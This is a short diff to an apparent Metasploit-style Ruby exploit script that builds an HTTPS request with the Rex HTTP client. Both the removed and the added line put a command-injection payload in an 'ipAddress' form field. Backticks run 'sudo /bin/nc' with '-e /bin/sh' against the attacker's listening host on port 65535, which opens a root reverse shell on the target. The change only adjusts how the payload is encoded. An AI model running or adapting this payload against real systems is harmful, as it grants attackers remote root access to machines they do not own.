@@ -18,7 +18,7 @@ begin
 
 sock = Rex::Proto::Http::Client.new(host, port = "443", context = {}, ssl = true)
 
-data = "ipAddress=`sudo+/bin/nc+'#{lhost}'+'65535'+-e+/bin/sh`"
+data = "ipAddress=`sudo+/bin/nc+#{lhost}+%2065535+-e+/bin/sh`"
 
 req = sock.request_cgi(
 	{
